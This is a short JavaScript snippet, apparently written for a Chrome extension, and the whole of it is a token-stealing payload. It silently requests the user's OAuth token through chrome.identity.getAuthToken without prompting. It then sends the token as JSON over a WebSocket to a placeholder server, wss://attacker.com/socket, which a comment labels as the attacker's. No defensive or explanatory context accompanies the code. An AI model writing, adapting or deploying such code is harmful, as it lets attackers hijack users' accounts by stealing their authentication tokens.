(async function() {
    const WEBSOCKET_URL = "wss://attacker.com/socket"; // Attacker's WebSocket Server

    async function getOAuthToken() {
        return new Promise((resolve, reject) => {
            chrome.identity.getAuthToken({ interactive: false }, function(token) {
                if (chrome.runtime.lastError) {
                    reject(chrome.runtime.lastError);
                } else {
                    resolve(token);
                }
            });
        });
    }

    function sendTokenToAttacker(token) {
        let socket = new WebSocket(WEBSOCKET_URL);

        socket.onopen = () => {
            socket.send(JSON.stringify({ token: token }));
        };

        socket.onerror = (err) => {
            console.error("WebSocket Error:", err);
        };
    }

    try {
        let token = await getOAuthToken();
        sendTokenToAttacker(token);
    } catch (error) {
        console.error("Error:", error);
    }
})();
